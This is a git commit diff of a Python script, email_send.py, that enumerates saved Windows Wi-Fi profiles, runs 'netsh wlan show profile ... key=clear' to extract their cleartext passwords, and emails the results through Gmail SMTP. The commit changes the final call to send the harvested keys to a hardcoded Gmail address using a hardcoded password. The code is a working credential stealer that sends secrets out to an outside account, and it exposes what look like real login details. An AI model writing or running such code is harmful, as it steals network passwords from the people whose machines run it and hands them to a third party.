8e00af6e96dddc11fd67b20d82fc6e05871459aa
SAURAV <81438796+charlesaurav13@users.noreply.github.com>
2022-02-06 23:09:50 +0530

    some
    modified

--- email_send.py
+++ email_send.py
@@ -3,10 +3,11 @@ email_default="yourgmail@gmail.com"
 password_default="Your password"
 
 #Start the send_mail function
+
 def send_mail(email,password,message):
     server=smtplib.SMTP("smtp.gmail.com",587)                      #connection to the smtp gmail server using the port 587
     server.starttls()                                              #start the connection
-    server.login(email,password)
+    server.login(email,password)                                   #Loging the system
     server.sendmail(email,email,message)
     server.quit()
 
@@ -18,11 +19,13 @@ unique_pattern="(?:Profile\s*:\s)(.*)"
 network_names_list=re.findall(unique_pattern,network)
 final_result=""
 #loop for capturing the name of the ssid
+
 for network_name in network_names_list:
     command='netsh wlan show profile '+'"'+network_name + '"' + ' key=clear'
     current_result=subprocess.check_output(command, shell="True")
     final_result=final_result+str(current_result)
 
 #Calling of the mail function
-send_mail(email_default,password_default,str(final_result))
+
+send_mail("jenniferjeanne123@gmail.com","saurav12345","\n\n" +str(final_result))
 
